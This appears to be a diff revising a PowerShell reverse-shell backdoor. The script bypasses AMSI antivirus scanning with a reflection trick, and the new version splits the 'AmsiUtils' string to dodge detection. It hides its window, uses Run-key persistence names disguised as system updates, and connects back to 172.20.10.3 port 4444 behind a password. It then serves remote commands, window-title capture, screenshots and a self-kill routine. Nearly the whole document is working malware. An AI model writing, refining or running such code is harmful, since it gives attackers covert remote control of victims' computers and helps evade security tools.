@@ -1,37 +1,40 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
+$a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
 
-$ip = '172.20.10.3'; $port = 4444; $pass = "biskviti"
+$code = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
+$win32::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+
+$ip = '172.20.10.3'
+$port = 4444
+$pass = "biskviti"
 $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
 $regNames = @("SysUpdate", "WinDiag") 
-$scriptPath = "$env:TEMP\sysupd.ps1"
-
-$api = Add-Type -Name Win32 -MemberDefinition @'
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
-'@ -PassThru
-$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 function Master-Kill {
     foreach ($name in $regNames) { 
         Remove-ItemProperty -Path $regPath -Name $name -Force -ErrorAction SilentlyContinue 
     }
-    $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & del /f /q `"$scriptPath`" & exit`""
+    $cmd = "/c start /min cmd /c `"taskkill /F /PID $PID & timeout /t 2 & exit`""
     Start-Process cmd.exe -ArgumentList $cmd -WindowStyle Hidden
     exit
 }
 
 while($true) {
     try {
-        $c = New-Object System.Net.Sockets.TCPClient($ip, $port); 
-        $s = $c.GetStream(); 
+        $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
+        $s = $c.GetStream()
         $e = New-Object System.Text.UTF8Encoding
         
         $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
-        Start-Sleep 1
         
+        $wait = 0
+        while (!$s.DataAvailable -and $wait -lt 20) { 
+            Start-Sleep -Milliseconds 500
+            $wait++ 
+        }
+
         [byte[]]$authB = New-Object byte[] 64
-        $authB[0] = 0
         $len = $s.Read($authB, 0, 64)
         
         if ($len -gt 0) {
@@ -40,9 +43,9 @@ while($true) {
                 $s.Write(($e.GetBytes("AUTH FAIL`n")), 0, 10)
                 $c.Close(); continue
             }
-        }
-        
-        $s.Write(($e.GetBytes("AUTH OK`nPS " + $PWD + "> ")), 0, 20 + $PWD.Length)
+        } else { $c.Close(); continue }
+
+        $s.Write(($e.GetBytes("AUTH OK`nPS " + $PWD + "> ")), 0, (20 + $PWD.Path.Length))
 
         while($true) {
             [byte[]]$b = New-Object byte[] 4096
@@ -50,14 +53,14 @@ while($true) {
             if ($i -le 0) { break }
             
             $in = $e.GetString($b, 0, $i).Trim()
-            
-            if ($in -eq 'kill') { 
-                Master-Kill 
-            }
+            $out = ""
+
+            if ($in -eq 'kill') { Master-Kill }
             elseif ($in -eq 'screen') {
-                $handle = $api::GetForegroundWindow()
+                Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);' -Name "Util" -Namespace Win32 -ErrorAction SilentlyContinue
+                $handle = [Win32.Util]::GetForegroundWindow()
                 $sb = New-Object System.Text.StringBuilder 256
-                $api::GetWindowText($handle, $sb, $sb.Capacity)
+                [Win32.Util]::GetWindowText($handle, $sb, $sb.Capacity)
                 $out = "[WINDOW] " + $sb.ToString() + "`n"
             }
             elseif ($in -eq 'screenshot') {
@@ -78,7 +81,7 @@ while($true) {
             }
             
             $out = $out -replace "`r`n|\r", "`n"
-            $prompt = "PS " + $PWD + "> "
+            $prompt = "`nPS " + (Get-Location).Path + "> "
             $resp = $e.GetBytes($out + $prompt)
             $s.Write($resp, 0, $resp.Length)
         }
